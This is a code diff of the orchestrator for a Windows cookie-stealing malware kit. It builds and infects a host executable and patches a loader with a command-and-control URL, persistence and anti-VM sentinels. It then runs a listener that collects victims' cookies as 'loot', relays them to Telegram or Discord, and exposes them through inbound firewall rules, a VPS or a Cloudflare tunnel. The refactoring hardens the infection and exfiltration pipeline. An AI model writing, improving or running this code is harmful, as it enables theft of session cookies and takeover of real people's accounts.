@@ -52,7 +52,8 @@ Press Ctrl+C to stop early.
 """
 import atexit, json, os, re, shutil, socket, subprocess, sys, time, struct, urllib.error, urllib.request, urllib.parse
 from c2auth import parse_c2_url, port_from_url
-from peutil import patch_ready
+from cklog import stage
+from cklog.stage import patch_loader
 
 HERE   = os.path.dirname(os.path.abspath(__file__))
 BIN    = os.path.join(HERE, "bin")
@@ -66,12 +67,12 @@ IFEC_APPS  = os.path.join(IFEC, "apps")
 LISTEN = os.path.join(HERE, "listen.py")
 BUILD  = os.path.join(HERE, "build.bat")
 CONFIG = os.path.join(HERE, "config.json")
-MAGIC  = b"CKLG"
-C2_SENTINEL = b"CKC2_DEADBEEF_"
-PERSIST_SENTINEL = b"CKPR____"
-PERSIST_ENABLE = b"CKPR0001"
-AV_SENTINEL = b"CKAV0000"
-AV_DISABLE  = b"CKAV0001"
+MAGIC  = stage.MAGIC
+C2_SENTINEL = stage.C2_SENTINEL
+PERSIST_SENTINEL = stage.PERSIST_SENTINEL
+PERSIST_ENABLE = stage.PERSIST_ENABLE
+AV_SENTINEL = stage.AV_SENTINEL
+AV_DISABLE  = stage.AV_DISABLE
 
 def log(msg):
     print(msg, flush=True)
@@ -271,152 +272,6 @@ def find_best_port(start=9400, end=9500, preferred=None):
             continue
     return None
 
-def _find_vcvars():
-    """Locate vcvars64.bat: vswhere first, then the two common install roots."""
-    candidates = []
-    vswhere = os.path.join(os.environ.get("ProgramFiles(x86)", r"C:\Program Files (x86)"),
-                           "Microsoft Visual Studio", "Installer", "vswhere.exe")
-    if os.path.isfile(vswhere):
-        try:
-            r = subprocess.run([vswhere, "-latest", "-products", "*",
-                                "-requires", "Microsoft.VisualStudio.Component.VC.Tools.x86.x64",
-                                "-property", "installationPath"],
-                               capture_output=True, text=True, timeout=15)
-            root = (r.stdout or "").strip().splitlines()
-            if root:
-                candidates.append(os.path.join(root[0], r"VC\Auxiliary\Build\vcvars64.bat"))
-        except Exception:
-            pass
-    for root in (os.environ.get("VSINSTALLDIR", ""),
-                 r"C:\Program Files\Microsoft Visual Studio\2022\Community",
-                 r"C:\Program Files\Microsoft Visual Studio\2022\Professional",
-                 r"C:\Program Files\Microsoft Visual Studio\2022\Enterprise",
-                 r"C:\Program Files (x86)\Microsoft Visual Studio\2022\BuildTools"):
-        if root:
-            candidates.append(os.path.join(root, r"VC\Auxiliary\Build\vcvars64.bat"))
-    for c in candidates:
-        if c and os.path.isfile(c):
-            return c
-    return None
-
-def _msvc_toolset():
-    """(toolset_dir) from vcvars64.bat, or None.
-
-    vcvars64.bat sits in <install>\\VC\\Auxiliary\\Build, so the toolset is
-    <install>\\VC\\Tools\\MSVC\\<ver>. Walking four levels up and joining
-    "Tools\\MSVC" lands on <install>\\Tools\\MSVC, which never exists -- that
-    was why the old check reported a missing toolset on a complete install.
-    """
-    vc = _find_vcvars()
-    if not vc:
-        return None
-    vc_dir = os.path.dirname(os.path.dirname(os.path.dirname(vc)))   # <install>\VC
-    msvc = os.path.join(vc_dir, "Tools", "MSVC")
-    if not os.path.isdir(msvc):
-        return None
-    for ver in sorted(os.listdir(msvc), reverse=True):
-        if os.path.isdir(os.path.join(msvc, ver)):
-            return os.path.join(msvc, ver)
-    return None
-
-
-def _clang_bin():
-    """clang-cl.exe's directory: the unpacked LLVM first, then PATH."""
-    local = os.path.join(os.environ.get("USERPROFILE", ""), "toolchain",
-                         "clang+llvm-19.1.7-x86_64-pc-windows-msvc", "bin")
-    if os.path.isfile(os.path.join(local, "clang-cl.exe")):
-        return local
-    found = shutil.which("clang-cl")
-    return os.path.dirname(found) if found else None
-
-
-def _sdk_version():
-    """Newest Windows 10/11 SDK that actually ships um headers and x64 libs."""
-    base = os.path.join(os.environ.get("ProgramFiles(x86)", r"C:\Program Files (x86)"),
-                        "Windows Kits", "10")
-    inc = os.path.join(base, "Include")
-    if not os.path.isdir(inc):
-        return None
-    vers = [d for d in os.listdir(inc)
-            if d.startswith("10.") and os.path.isfile(os.path.join(inc, d, "um", "windows.h"))]
-    vers.sort(key=lambda v: [int(x) for x in v.split(".") if x.isdigit()], reverse=True)
-    for v in vers:
-        if os.path.isfile(os.path.join(base, "Lib", v, "um", "x64", "kernel32.lib")):
-            return v
-    return None
-
-
-def _rc_exe(sdk_ver):
-    """rc.exe from the unpacked SDK BuildTools package, then the SDK bin tree.
-
-    There is no MSVC resource compiler in the toolset directory, so build_clang.bat
-    needs an external one: either NuGet's Microsoft.Windows.SDK.BuildTools or the
-    Windows Kits bin tree (stripped on some installs).
-    """
-    bt = os.path.join(os.environ.get("USERPROFILE", ""), "toolchain", "sdkbt", "bin")
-    if os.path.isdir(bt):
-        for ver in sorted(os.listdir(bt), reverse=True):
-            c = os.path.join(bt, ver, "x64", "rc.exe")
-            if os.path.isfile(c):
-                return c
-    if sdk_ver:
-        c = os.path.join(os.environ.get("ProgramFiles(x86)", r"C:\Program Files (x86)"),
-                         "Windows Kits", "10", "bin", sdk_ver, "x64", "rc.exe")
-        if os.path.isfile(c):
-            return c
-    return None
-
-
-def _clang_ready():
-    """clang-cl + lld-link + llvm-ml + MSVC headers/libs + SDK libs + rc.exe.
-
-    The compiler binaries can be stripped from a VS install while its headers,
-    libs and CRT survive. clang-cl produces the same MSVC-ABI objects from those
-    files, so the fallback is a real toolchain, not a degraded one.
-    """
-    if not os.path.isfile(os.path.join(HERE, "build_clang.bat")):
-        return False, "build_clang.bat missing"
-    cbin = _clang_bin()
-    if not cbin:
-        return False, "clang-cl.exe not found (unpack LLVM into %USERPROFILE%\\toolchain)"
-    for exe in ("clang-cl.exe", "lld-link.exe", "llvm-ml.exe"):
-        if not os.path.isfile(os.path.join(cbin, exe)):
-            return False, "%s missing next to clang-cl.exe" % exe
-    msvc = _msvc_toolset()
-    if not msvc or not os.path.isfile(os.path.join(msvc, "include", "vcruntime.h")):
-        return False, "MSVC headers/libs not found (clang-cl still needs them)"
-    if not os.path.isdir(os.path.join(msvc, "lib", "x64")):
-        return False, "MSVC x64 libs missing under %s" % msvc
-    sdk = _sdk_version()
-    if not sdk:
-        return False, "Windows SDK 10 headers/libs not found"
-    um = os.path.join(os.environ.get("ProgramFiles(x86)", r"C:\Program Files (x86)"),
-                      "Windows Kits", "10", "Lib", sdk, "um", "x64", "kernel32.lib")
-    if not os.path.isfile(um):
-        return False, "Windows SDK %s x64 libs missing" % sdk
-    if not _rc_exe(sdk):
-        return False, "rc.exe not found (SDK bin tree or toolchain\\sdkbt)"
-    return True, "clang-cl (%s)" % os.path.basename(msvc)
-
-
-def _compiler_ready():
-    """MSVC first; fall back to clang-cl when the install has headers but no .exe."""
-    msvc = _msvc_toolset()
-    if msvc:
-        ver = os.path.basename(msvc)
-        cl = os.path.join(msvc, "bin", "Hostx64", "x64", "cl.exe")
-        ml = os.path.join(msvc, "bin", "Hostx64", "x64", "ml64.exe")
-        if os.path.isfile(cl) and os.path.isfile(ml):
-            return True, ver
-    ok, info = _clang_ready()
-    if ok:
-        return True, info
-    if msvc:
-        return False, ("cl.exe/ml64.exe missing and no clang fallback: %s -- repair "
-                       "'Desktop development with C++' in the Visual Studio Installer"
-                       % info)
-    return False, info
-
 def ensure_build():
     """Build loader.exe + ckdll.dll + ckdec.exe if they don't exist."""
     if all(os.path.isfile(p) for p in (LOADER, DLL, CKDEC)):
@@ -431,27 +286,20 @@ def ensure_build():
     if not os.path.isfile(BUILD):
         log("[-] build.bat not found")
         return False
-    ok, info = _compiler_ready()
+    from cklog import toolchain
+    ok, info = toolchain.compiler_ready(HERE)
     if not ok:
         log("[-] no usable C++ toolchain: %s" % info)
         log("    install Visual Studio Build Tools -> 'Desktop development with C++'")
         log("    (or copy prebuilt bin/loader.exe + bin/ckdll.dll + bin/ckdec.exe from another machine)")
         return False
-    log("[*] building binaries with MSVC %s (needs a minute)..." % info)
-    try:
-        r = subprocess.run(["cmd", "/c", BUILD], cwd=HERE,
-                           capture_output=True, text=True, timeout=300)
-    except subprocess.TimeoutExpired:
-        log("[-] build timed out after 300s")
-        return False
-    if r.stdout:
-        for line in r.stdout.strip().splitlines():
+    log("[*] building binaries with %s (needs a minute)..." % info)
+    ok, output = toolchain.run_script(HERE, "build.bat", timeout=300)
+    if output:
+        for line in output.splitlines():
             log("    " + line)
-    if r.stderr:
-        for line in r.stderr.strip().splitlines():
-            log("    [!] " + line)
-    if r.returncode != 0:
-        log("[-] build failed (exit %d)" % r.returncode)
+    if not ok:
+        log("[-] build failed")
         return False
     if os.path.isfile(LOADER) and os.path.isfile(DLL):
         log("[+] build OK")
@@ -500,29 +348,11 @@ def find_main_exe(folder):
 # ------------------------------------------------------------------ infection
 
 def _patch_loader(loader_bytes, c2_url, persist=False, no_anti_vm=False):
-    """Strip old appended data from loader, patch C2 + persistence + anti-VM sentinels.
-    Returns patched bytes.
-    The sentinels are in the LOADER's .data section (plaintext), not in the
-    encrypted payload — the loader patches the decrypted payload at runtime."""
-    idx = loader_bytes.rfind(MAGIC)
-    if idx != -1 and idx > len(loader_bytes) - 12:
-        old_len = struct.unpack_from("<I", loader_bytes, idx - 4)[0]
-        loader_bytes = loader_bytes[:idx - 4 - old_len]
-    if c2_url:
-        sidx = patch_ready(loader_bytes, C2_SENTINEL, 256)
-        if sidx != -1:
-            url_bytes = c2_url.encode("utf-8")[:255]
-            url_padded = url_bytes + b"\0" * (256 - len(url_bytes))
-            loader_bytes = loader_bytes[:sidx] + url_padded + loader_bytes[sidx+256:]
-    if persist:
-        pidx = patch_ready(loader_bytes, PERSIST_SENTINEL, 8)
-        if pidx != -1:
-            loader_bytes = loader_bytes[:pidx] + PERSIST_ENABLE + loader_bytes[pidx+8:]
-    if no_anti_vm:
-        aidx = patch_ready(loader_bytes, AV_SENTINEL, 8)
-        if aidx != -1:
-            loader_bytes = loader_bytes[:aidx] + AV_DISABLE + loader_bytes[aidx+8:]
-    return loader_bytes
+    """Compatibility wrapper; failed strict patches must abort staging."""
+    patched, status = patch_loader(loader_bytes, c2_url, persist, no_anti_vm)
+    if not status["ok"]:
+        raise ValueError("; ".join(status["errors"]))
+    return patched
 
 def _extract_original_host(host_bytes):
     """If host was already infected, extract the original bytes."""
@@ -658,17 +488,19 @@ def _listener_health(port, timeout=4):
     except Exception:
         return False
 
-def start_listener(port, telegram=None, discord=None):
+def start_listener(port, telegram=None, discord=None, tunnel=False):
     """Start listen.py in background. Returns the process handle.
     If telegram or discord are provided, listen.py relays received cookies to them.
     Uses CREATE_NEW_CONSOLE so the listener has its own window (can't be killed by
-    closing the main terminal); the window is its log."""
+    closing the main terminal); the window is its log. Tunnel listeners are
+    loopback-only and never need an inbound firewall rule."""
     os.makedirs(LOOT, exist_ok=True)
+    bind = "127.0.0.1" if tunnel else "0.0.0.0"
     # refuse to start twice: a zombie listener from a previous run kept the port,
     # the new listener died with EADDRINUSE and every victim POST was lost
     try:
         probe = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        probe.bind(("0.0.0.0", port))
+        probe.bind((bind, port))
         probe.close()
     except OSError:
         # port busy: if it is OUR zombie listener from a previous crashed run,
@@ -689,13 +521,13 @@ def start_listener(port, telegram=None, discord=None):
                 log("[!] port %d is held by another process (PID=%d: %s)" % (port, pid, (cl or "?")[:90]))
             log("[!] kill it or pass --port / --find-port")
             return None
-    # Windows Firewall: inbound is blocked by default for python.exe.
-    # A missing rule = the payload cannot POST = local fallback only.
-    if sys.platform == "win32":
+    # Direct listeners need inbound access; tunnel peers only connect locally.
+    if sys.platform == "win32" and not tunnel:
         if _open_firewall_port(port):
             log("[+] firewall: inbound TCP %d allowed" % port)
         else:
-            log("[!] could not add the inbound firewall rule (needs an Administrator shell).")
+            log("[!] firewall rule failed: inbound TCP %d may be unreachable "
+                "(Administrator shell required)." % port)
             log("[!]   run once as admin: netsh advfirewall firewall add rule "
                 "name=\"cookielog C2 %d\" dir=in action=allow protocol=TCP localport=%d" % (port, port))
     # Archive old loot (both old and new filenames). Deleting it silently threw
@@ -715,7 +547,7 @@ def start_listener(port, telegram=None, discord=None):
             log("[*] previous loot archived: %s (%d files)" % (dest, len(present)))
         except OSError as ex:
             log("[!] could not archive old loot: %s" % ex)
-    cmd = [sys.executable, "-u", LISTEN, str(port)]
+    cmd = [sys.executable, "-u", LISTEN, str(port), "--bind", bind]
     if telegram:
         cmd += ["--telegram", telegram]
     if discord:
@@ -747,20 +579,36 @@ def start_listener(port, telegram=None, discord=None):
     else:
         log("[+] listener on port %d (PID=%d), ingest verified" % (port, proc.pid))
     lan = detect_ip()
-    if not lan.startswith("127."):
-        log("[*] listener bound on 0.0.0.0 — LAN address: http://%s:%d/" % (lan, port))
+    if not tunnel and not lan.startswith("127."):
+        log("[*] listener bound on %s — LAN address: http://%s:%d/" % (bind, lan, port))
+    elif tunnel:
+        log("[*] tunnel listener bound on 127.0.0.1:%d (no inbound firewall rule)" % port)
     return proc
 
-def _remote_tls_c2(c2_url, run_local):
-    """True when the C2 is an https endpoint served elsewhere (Caddy on the VPS).
-    auto must not try to bind that port locally with its plain-HTTP listener."""
+
+def _remote_c2(c2_url, run_local):
+    """True for an endpoint served elsewhere, not this machine's direct listener.
+
+    HTTPS has always been remote because start_listener only serves plain HTTP.
+    A manually supplied HTTP endpoint is remote too, except when it names the
+    detected LAN address of this machine (the GUI's normal direct-listener URL).
+    """
     if not c2_url or run_local:
         return False
     try:
         info = parse_c2_url(c2_url)
     except ValueError:
         return False
-    return bool(info.get("tls")) and not info.get("loopback")
+    if info["loopback"]:
+        return False
+    if not info["tls"] and info["host"].lower() == detect_ip().lower():
+        return False
+    return True
+
+
+def _remote_tls_c2(c2_url, run_local):
+    """Backward-compatible name for the remote-endpoint decision."""
+    return _remote_c2(c2_url, run_local)
 
 
 # ------------------------------------------------------------------ tunnel C2
@@ -1023,6 +871,18 @@ def _wait_and_cleanup(proc, host_path, exe_name, backup=None):
 
 # ------------------------------------------------------------------ GUI
 
+def _rewrite_c2_port(url, port):
+    """Change only the URL port, retaining its scheme, path, query and fragment."""
+    parts = urllib.parse.urlsplit(url)
+    if not parts.scheme or not parts.hostname:
+        raise ValueError("C2 URL must include a scheme and hostname")
+    host = parts.hostname
+    if ":" in host:
+        host = "[%s]" % host
+    return urllib.parse.urlunsplit((parts.scheme, "%s:%d" % (host, port),
+                                    parts.path, parts.query, parts.fragment))
+
+
 def pick_gui(default_tunnel=False):
     """Open the graphical picker.
 
@@ -1111,8 +971,10 @@ def pick_gui(default_tunnel=False):
             _status("Port %d is free." % best, "ok")
             cur = c2_var.get().strip()
             if cur:
-                import re as _re
-                c2_var.set(_re.sub(r":\d+/", ":%d/" % best, cur))
+                try:
+                    c2_var.set(_rewrite_c2_port(cur, best))
+                except ValueError:
+                    pass
 
         def _detect_lan():
             ip = detect_ip()
@@ -1230,11 +1092,7 @@ def pick_gui(default_tunnel=False):
             c2 = c2_var.get().strip()
             if c2:
                 try:
-                    p = _port_value()
-                    body = c2.split("://", 1)[-1]
-                    auth, _, rest = body.partition("/")
-                    host = auth.rsplit(":", 1)[0] if ":" in auth else auth
-                    c2 = "http://%s:%d/%s" % (host, p, rest)
+                    c2 = _rewrite_c2_port(c2, _port_value())
                 except (ValueError, IndexError):
                     pass
                 result["c2_url"] = c2
@@ -1732,15 +1590,15 @@ def run_one(host_path, mode, run_local, port, telegram, discord, persist, no_ant
         c2_url = "http://127.0.0.1:%d/" % port
         log("[+] C2 URL (local test): %s" % c2_url)
 
-    # 3. start listener (https C2 already runs on the VPS -- nothing to bind here).
-    #    A quick tunnel needs BOTH: Cloudflare forwards to the loopback listener.
-    remote_c2 = _remote_tls_c2(c2_url, run_local) and not tunnel
+    # A manually supplied remote endpoint is already served elsewhere. A quick
+    # tunnel instead needs a loopback listener behind cloudflared.
+    remote_c2 = bool(c2_override) and _remote_c2(c2_url, run_local) and not tunnel
     if remote_c2:
-        log("\n[3/5] listener: remote TLS C2, local listener not started")
+        log("\n[3/5] listener: remote C2, local listener not started")
         listener = None
     else:
         log("\n[3/5] starting listener...")
-        listener = start_listener(port, telegram, discord)
+        listener = start_listener(port, telegram, discord, tunnel=tunnel)
         if not listener:
             log("[-] could not start listener")
             return
@@ -2109,16 +1967,15 @@ def main():
         elif cfg.get("discord"):
             log("[*] Discord relay: disabled (checkbox off, key saved in config)")
 
-    # 4. start the local listener, then whatever transport sits in front of it.
-    #    A remote TLS C2 (VPS + Caddy) already serves the endpoint, so nothing
-    #    binds here; --tunnel needs BOTH -- Cloudflare forwards to the listener.
-    remote_c2 = _remote_tls_c2(c2_url, run_local) and not tunnel
+    # 4. A manually supplied remote endpoint is already served elsewhere;
+    #    --tunnel needs a loopback listener behind cloudflared.
+    remote_c2 = bool(c2_override) and _remote_c2(c2_url, run_local) and not tunnel
     if remote_c2:
-        log("\n[4/5] listener: remote TLS C2, local listener not started")
+        log("\n[4/5] listener: remote C2, local listener not started")
         listener = None
     else:
         log("\n[4/5] starting listener...")
-        listener = start_listener(port, telegram, discord)
+        listener = start_listener(port, telegram, discord, tunnel=tunnel)
         if not listener:
             log("[-] could not start listener")
             return 1
